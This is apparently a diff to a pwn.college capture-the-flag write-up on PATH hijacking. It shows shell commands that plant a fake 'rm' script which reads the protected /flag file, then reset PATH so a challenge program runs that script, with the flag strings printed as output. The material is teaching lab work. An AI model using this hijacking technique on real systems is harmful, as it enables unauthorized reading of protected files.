@@ -60,10 +60,10 @@ pwn.college{MZnCgWbo8_OA3XPbjuitkiiLDV9.dZzNyUDL1ATN0czW}
 * Now when the /challenge/run command tries to invoke rm, it'll run our executable instead
 
 ```console
-hacker@path~hijacking-commands:~$ printf "read var < /flag\n\$var" > rm
+hacker@path~hijacking-commands:~$ printf "read var < /flag\necho \$var" > rm
 hacker@path~hijacking-commands:~$ chmod u+x rm
 hacker@path~hijacking-commands:~$ PATH=/home/hacker
 hacker@path~hijacking-commands:~$ /challenge/run
 Trying to remove /flag...
-/home/hacker/rm: line 2: pwn.college{4jWi2IsD6GEbvaR8z8TTp4rRq0O.ddzNyUDL1ATN0czW}: command not found
+pwn.college{4jWi2IsD6GEbvaR8z8TTp4rRq0O.ddzNyUDL1ATN0czW}
 ```
